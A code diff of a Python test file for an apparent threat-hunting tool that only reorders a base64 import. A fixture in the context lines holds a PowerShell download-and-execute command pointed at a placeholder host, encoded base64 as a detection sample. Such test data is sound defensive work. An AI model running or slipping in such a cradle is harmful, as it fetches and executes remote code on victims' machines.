@@ -7,6 +7,7 @@ everything else; the tests pin both halves.
 
 from __future__ import annotations
 
+import base64
 import bz2
 import json
 import zlib
@@ -18,9 +19,6 @@ from ath.hunting import run_hunt
 from ath.schema import EVENT_CONTROL, EVENT_LOGON, EVENT_NETWORK, EVENT_PROCESS, SIG_UNKNOWN
 from ath.telemetry.loader import Telemetry
 from ath.telemetry.winlogbeat_source import WinlogbeatSource
-
-
-import base64
 
 ENCODED = base64.b64encode(
     "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')".encode("utf-16le")
